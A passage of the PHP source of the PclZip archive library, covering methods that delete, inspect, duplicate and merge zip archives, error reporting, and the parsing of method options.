        // ----- Look for the optional second argument
        if ($v_size == 2) {
          $v_remove_path = $v_arg_list[1];
        }
        else if ($v_size > 2) {
          // ----- Error log
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
          return 0;
        }
      }
    }

    // ----- Trace
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "index='$p_index', path='$v_path', remove_path='$v_remove_path', remove_all_path='".($v_remove_path?'true':'false')."'");

    // ----- Trick
    // Here I want to reuse extractByRule(), so I need to parse the $p_index
    // with privParseOptions()
    $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
    $v_options_trick = array();
    $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,
                                        array (PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) {
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
        return 0;
    }
    $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];

    // ----- Call the extracting fct
    if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) {
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0, PclZip::errorInfo());
        return(0);
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $p_list);
    return $p_list;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function :
  //   delete([$p_option, $p_option_value, ...])
  // Description :
  //   This method removes files from the archive.
  //   If no parameters are given, then all the archive is emptied.
  // Parameters :
  //   None or optional arguments.
  // Options :
  //   PCLZIP_OPT_BY_INDEX :
  //   PCLZIP_OPT_BY_NAME :
  //   PCLZIP_OPT_BY_EREG : 
  //   PCLZIP_OPT_BY_PREG :
  // Return Values :
  //   0 on failure,
  //   The list of the files which are still present in the archive.
  //   (see PclZip::listContent() for list entry format)
  // --------------------------------------------------------------------------------
  function delete()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::delete", "");
    $v_result=1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Check archive
    if (!$this->privCheckFormat()) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return(0);
    }

    // ----- Set default values
    $v_options = array();

    // ----- Look for variable options arguments
    $v_size = func_num_args();
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "$v_size arguments passed to the method");

    // ----- Look for arguments
    if ($v_size > 0) {
      // ----- Get the arguments
      $v_arg_list = func_get_args();

      // ----- Parse the options
      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                        array (PCLZIP_OPT_BY_NAME => 'optional',
                                               PCLZIP_OPT_BY_EREG => 'optional',
                                               PCLZIP_OPT_BY_PREG => 'optional',
                                               PCLZIP_OPT_BY_INDEX => 'optional' ));
      if ($v_result != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
          return 0;
      }
    }

    // ----- Magic quotes trick
    $this->privDisableMagicQuotes();

    // ----- Call the delete fct
    $v_list = array();
    if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
      $this->privSwapBackMagicQuotes();
      unset($v_list);
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0, PclZip::errorInfo());
      return(0);
    }

    // ----- Magic quotes trick
    $this->privSwapBackMagicQuotes();

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_list);
    return $v_list;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : deleteByIndex()
  // Description :
  //   ***** Deprecated *****
  //   delete(PCLZIP_OPT_BY_INDEX, $p_index) should be prefered.
  // --------------------------------------------------------------------------------
  function deleteByIndex($p_index)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::deleteByIndex", "index='$p_index'");
    
    $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $p_list);
    return $p_list;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : properties()
  // Description :
  //   This method gives the properties of the archive.
  //   The properties are :
  //     nb : Number of files in the archive
  //     comment : Comment associated with the archive file
  //     status : not_exist, ok
  // Parameters :
  //   None
  // Return Values :
  //   0 on failure,
  //   An array with the archive properties.
  // --------------------------------------------------------------------------------
  function properties()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::properties", "");

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Magic quotes trick
    $this->privDisableMagicQuotes();

    // ----- Check archive
    if (!$this->privCheckFormat()) {
      $this->privSwapBackMagicQuotes();
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return(0);
    }

    // ----- Default properties
    $v_prop = array();
    $v_prop['comment'] = '';
    $v_prop['nb'] = 0;
    $v_prop['status'] = 'not_exist';

    // ----- Look if file exists
    if (@is_file($this->zipname))
    {
      // ----- Open the zip file
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
      if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
      {
        $this->privSwapBackMagicQuotes();
        
        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), 0);
        return 0;
      }

      // ----- Read the central directory informations
      $v_central_dir = array();
      if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
      {
        $this->privSwapBackMagicQuotes();
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
        return 0;
      }

      // ----- Close the zip file
      $this->privCloseFd();

      // ----- Set the user attributes
      $v_prop['comment'] = $v_central_dir['comment'];
      $v_prop['nb'] = $v_central_dir['entries'];
      $v_prop['status'] = 'ok';
    }

    // ----- Magic quotes trick
    $this->privSwapBackMagicQuotes();

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_prop);
    return $v_prop;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : duplicate()
  // Description :
  //   This method creates an archive by copying the content of an other one. If
  //   the archive already exist, it is replaced by the new one without any warning.
  // Parameters :
  //   $p_archive : The filename of a valid archive, or
  //                a valid PclZip object.
  // Return Values :
  //   1 on success.
  //   0 or a negative value on error (error code).
  // --------------------------------------------------------------------------------
  function duplicate($p_archive)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::duplicate", "");
    $v_result = 1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Look if the $p_archive is a PclZip object
    if ((is_object($p_archive)) && (get_class($p_archive) == 'pclzip'))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "The parameter is valid PclZip object '".$p_archive->zipname."'");

      // ----- Duplicate the archive
      $v_result = $this->privDuplicate($p_archive->zipname);
    }

    // ----- Look if the $p_archive is a string (so a filename)
    else if (is_string($p_archive))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "The parameter is a filename '$p_archive'");

      // ----- Check that $p_archive is a valid zip file
      // TBC : Should also check the archive format
      if (!is_file($p_archive)) {
        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "No file with filename '".$p_archive."'");
        $v_result = PCLZIP_ERR_MISSING_FILE;
      }
      else {
        // ----- Duplicate the archive
        $v_result = $this->privDuplicate($p_archive);
      }
    }

    // ----- Invalid variable
    else
    {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
      $v_result = PCLZIP_ERR_INVALID_PARAMETER;
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : merge()
  // Description :
  //   This method merge the $p_archive_to_add archive at the end of the current
  //   one ($this).
  //   If the archive ($this) does not exist, the merge becomes a duplicate.
  //   If the $p_archive_to_add archive does not exist, the merge is a success.
  // Parameters :
  //   $p_archive_to_add : It can be directly the filename of a valid zip archive,
  //                       or a PclZip object archive.
  // Return Values :
  //   1 on success,
  //   0 or negative values on error (see below).
  // --------------------------------------------------------------------------------
  function merge($p_archive_to_add)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::merge", "");
    $v_result = 1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Check archive
    if (!$this->privCheckFormat()) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return(0);
    }

    // ----- Look if the $p_archive_to_add is a PclZip object
    if ((is_object($p_archive_to_add)) && (get_class($p_archive_to_add) == 'pclzip'))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The parameter is valid PclZip object");

      // ----- Merge the archive
      $v_result = $this->privMerge($p_archive_to_add);
    }

    // ----- Look if the $p_archive_to_add is a string (so a filename)
    else if (is_string($p_archive_to_add))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The parameter is a filename");

      // ----- Create a temporary archive
      $v_object_archive = new PclZip($p_archive_to_add);

      // ----- Merge the archive
      $v_result = $this->privMerge($v_object_archive);
    }

    // ----- Invalid variable
    else
    {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
      $v_result = PCLZIP_ERR_INVALID_PARAMETER;
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------



  // --------------------------------------------------------------------------------
  // Function : errorCode()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function errorCode()
  {
    if (PCLZIP_ERROR_EXTERNAL == 1) {
      return(PclErrorCode());
    }
    else {
      return($this->error_code);
    }
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : errorName()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function errorName($p_with_code=false)
  {
    $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',
                      PCLZIP_ERR_WRITE_OPEN_FAIL => 'PCLZIP_ERR_WRITE_OPEN_FAIL',
                      PCLZIP_ERR_READ_OPEN_FAIL => 'PCLZIP_ERR_READ_OPEN_FAIL',
                      PCLZIP_ERR_INVALID_PARAMETER => 'PCLZIP_ERR_INVALID_PARAMETER',
                      PCLZIP_ERR_MISSING_FILE => 'PCLZIP_ERR_MISSING_FILE',
                      PCLZIP_ERR_FILENAME_TOO_LONG => 'PCLZIP_ERR_FILENAME_TOO_LONG',
                      PCLZIP_ERR_INVALID_ZIP => 'PCLZIP_ERR_INVALID_ZIP',
                      PCLZIP_ERR_BAD_EXTRACTED_FILE => 'PCLZIP_ERR_BAD_EXTRACTED_FILE',
                      PCLZIP_ERR_DIR_CREATE_FAIL => 'PCLZIP_ERR_DIR_CREATE_FAIL',
                      PCLZIP_ERR_BAD_EXTENSION => 'PCLZIP_ERR_BAD_EXTENSION',
                      PCLZIP_ERR_BAD_FORMAT => 'PCLZIP_ERR_BAD_FORMAT',
                      PCLZIP_ERR_DELETE_FILE_FAIL => 'PCLZIP_ERR_DELETE_FILE_FAIL',
                      PCLZIP_ERR_RENAME_FILE_FAIL => 'PCLZIP_ERR_RENAME_FILE_FAIL',
                      PCLZIP_ERR_BAD_CHECKSUM => 'PCLZIP_ERR_BAD_CHECKSUM',
                      PCLZIP_ERR_INVALID_ARCHIVE_ZIP => 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP',
                      PCLZIP_ERR_MISSING_OPTION_VALUE => 'PCLZIP_ERR_MISSING_OPTION_VALUE',
                      PCLZIP_ERR_INVALID_OPTION_VALUE => 'PCLZIP_ERR_INVALID_OPTION_VALUE',
                      PCLZIP_ERR_UNSUPPORTED_COMPRESSION => 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION',
                      PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                      ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                      ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                    );

    if (isset($v_name[$this->error_code])) {
      $v_value = $v_name[$this->error_code];
    }
    else {
      $v_value = 'NoName';
    }

    if ($p_with_code) {
      return($v_value.' ('.$this->error_code.')');
    }
    else {
      return($v_value);
    }
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : errorInfo()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function errorInfo($p_full=false)
  {
    if (PCLZIP_ERROR_EXTERNAL == 1) {
      return(PclErrorString());
    }
    else {
      if ($p_full) {
        return($this->errorName(true)." : ".$this->error_string);
      }
      else {
        return($this->error_string." [code ".$this->error_code."]");
      }
    }
  }
  // --------------------------------------------------------------------------------


// --------------------------------------------------------------------------------
// ***** UNDER THIS LINE ARE DEFINED PRIVATE INTERNAL FUNCTIONS *****
// *****                                                        *****
// *****       THESES FUNCTIONS MUST NOT BE USED DIRECTLY       *****
// --------------------------------------------------------------------------------



  // --------------------------------------------------------------------------------
  // Function : privCheckFormat()
  // Description :
  //   This method check that the archive exists and is a valid zip archive.
  //   Several level of check exists. (futur)
  // Parameters :
  //   $p_level : Level of check. Default 0.
  //              0 : Check the first bytes (magic codes) (default value))
  //              1 : 0 + Check the central directory (futur)
  //              2 : 1 + Check each file header (futur)
  // Return Values :
  //   true on success,
  //   false on error, the error code is set.
  // --------------------------------------------------------------------------------
  function privCheckFormat($p_level=0)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privCheckFormat", "");
    $v_result = true;

        // ----- Reset the file system cache
    clearstatcache();

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Look if the file exits
    if (!is_file($this->zipname)) {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, false, PclZip::errorInfo());
      return(false);
    }

    // ----- Check that the file is readeable
    if (!is_readable($this->zipname)) {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, false, PclZip::errorInfo());
      return(false);
    }

    // ----- Check the magic code
    // TBC

    // ----- Check the central header
    // TBC

    // ----- Check each file header
    // TBC

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privParseOptions()
  // Description :
  //   This internal methods reads the variable list of arguments ($p_options_list,
  //   $p_size) and generate an array with the options and values ($v_result_list).
  //   $v_requested_options contains the options that can be present and those that
  //   must be present.
  //   $v_requested_options is an array, with the option value as key, and 'optional',
  //   or 'mandatory' as value.
  // Parameters :
  //   See above.
  // Return Values :
  //   1 on success.
  //   0 on failure.
  // --------------------------------------------------------------------------------
  function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privParseOptions", "");
    $v_result=1;
    
    // ----- Read the options
    $i=0;
    while ($i<$p_size) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Looking for table index $i, option = '".PclZipUtilOptionText($p_options_list[$i])."(".$p_options_list[$i].")'");

      // ----- Check if the option is supported
      if (!isset($v_requested_options[$p_options_list[$i]])) {
        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }

      // ----- Look for next option
      switch ($p_options_list[$i]) {
        // ----- Look for options that request a path value
        case PCLZIP_OPT_PATH :
        case PCLZIP_OPT_REMOVE_PATH :
        case PCLZIP_OPT_ADD_PATH :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
          $i++;
        break;

        case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          if (   is_string($p_options_list[$i+1])
              && ($p_options_list[$i+1] != '')) {
            $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
            $i++;
          }
          else {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." set with an empty value is ignored.");
          }
        break;

        // ----- Look for options that request an array of string for value
        case PCLZIP_OPT_BY_NAME :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          if (is_string($p_options_list[$i+1])) {
              $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
          }
          else if (is_array($p_options_list[$i+1])) {
              $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
          }
          else {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
          ////--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
          $i++;
        break;

        // ----- Look for options that request an EREG or PREG expression
        case PCLZIP_OPT_BY_EREG :
        case PCLZIP_OPT_BY_PREG :
        //case PCLZIP_OPT_CRYPT :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          if (is_string($p_options_list[$i+1])) {
              $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
          }
          else {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
          $i++;
        break;

        // ----- Look for options that takes a string
        case PCLZIP_OPT_COMMENT :
        case PCLZIP_OPT_ADD_COMMENT :
        case PCLZIP_OPT_PREPEND_COMMENT :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE,
                                             "Missing parameter value for option '"
                                                                 .PclZipUtilOptionText($p_options_list[$i])
                                                                 ."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          if (is_string($p_options_list[$i+1])) {
              $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
          }
          else {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE,
                                             "Wrong parameter value for option '"
                                                                 .PclZipUtilOptionText($p_options_list[$i])
                                                                 ."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
          $i++;
        break;

        // ----- Look for options that request an array of index
        case PCLZIP_OPT_BY_INDEX :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          $v_work_list = array();
          if (is_string($p_options_list[$i+1])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Index value is a string '".$p_options_list[$i+1]."'");

              // ----- Remove spaces
              $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');

              // ----- Parse items
              $v_work_list = explode(",", $p_options_list[$i+1]);
          }
          else if (is_integer($p_options_list[$i+1])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Index value is an integer '".$p_options_list[$i+1]."'");
              $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
          }
          else if (is_array($p_options_list[$i+1])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Index value is an array");
              $v_work_list = $p_options_list[$i+1];
          }
          else {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
          
          // ----- Reduce the index list
          // each index item in the list must be a couple with a start and
          // an end value : [0,3], [5-5], [8-10], ...
          // ----- Check the format of each item
          $v_sort_flag=false;
          $v_sort_value=0;
          for ($j=0; $j<sizeof($v_work_list); $j++) {
              // ----- Explode the item
              $v_item_list = explode("-", $v_work_list[$j]);
              $v_size_item_list = sizeof($v_item_list);
              
              // ----- TBC : Here we might check that each item is a
              // real integer ...
              
              // ----- Look for single value
              if ($v_size_item_list == 1) {
                  // ----- Set the option value
                  $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                  $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
              }
              elseif ($v_size_item_list == 2) {
                  // ----- Set the option value
                  $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                  $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
              }
              else {
                  // ----- Error log
                  PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                  // ----- Return
                  //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
                  return PclZip::errorCode();
              }

              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extracted index item = [".$v_result_list[$p_options_list[$i]][$j]['start'].",".$v_result_list[$p_options_list[$i]][$j]['end']."]");

              // ----- Look for list sort
              if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The list should be sorted ...");
                  $v_sort_flag=true;

                  // ----- TBC : An automatic sort should be writen ...
                  // ----- Error log
                  PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                  // ----- Return
                  //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
                  return PclZip::errorCode();
              }
              $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
          }
          
          // ----- Sort the items
          if ($v_sort_flag) {
              // TBC : To Be Completed
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "List sorting is not yet write ...");
          }

          // ----- Next option
          $i++;
        break;

        // ----- Look for options that request no value
        case PCLZIP_OPT_REMOVE_ALL_PATH :
        case PCLZIP_OPT_EXTRACT_AS_STRING :
        case PCLZIP_OPT_NO_COMPRESSION :
        case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
        case PCLZIP_OPT_REPLACE_NEWER :
        case PCLZIP_OPT_STOP_ON_ERROR :
          $v_result_list[$p_options_list[$i]] = true;
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
        break;

        // ----- Look for options that request an octal value
        case PCLZIP_OPT_SET_CHMOD :
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($p_options_list[$i])." = '".$v_result_list[$p_options_list[$i]]."'");
          $i++;
        break;

        // ----- Look for options that request a call-back
        case PCLZIP_CB_PRE_EXTRACT :
        case PCLZIP_CB_POST_EXTRACT :
        case PCLZIP_CB_PRE_ADD :
        case PCLZIP_CB_POST_ADD :
        /* for futur use
        case PCLZIP_CB_PRE_DELETE :
        case PCLZIP_CB_POST_DELETE :
        case PCLZIP_CB_PRE_LIST :
        case PCLZIP_CB_POST_LIST :
        */
          // ----- Check the number of parameters
          if (($i+1) >= $p_size) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Get the value
          $v_function_name = $p_options_list[$i+1];
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "call-back ".PclZipUtilOptionText($p_options_list[$i])." = '".$v_function_name."'");

          // ----- Check that the value is a valid existing function
          if (!function_exists($v_function_name)) {
            // ----- Error log
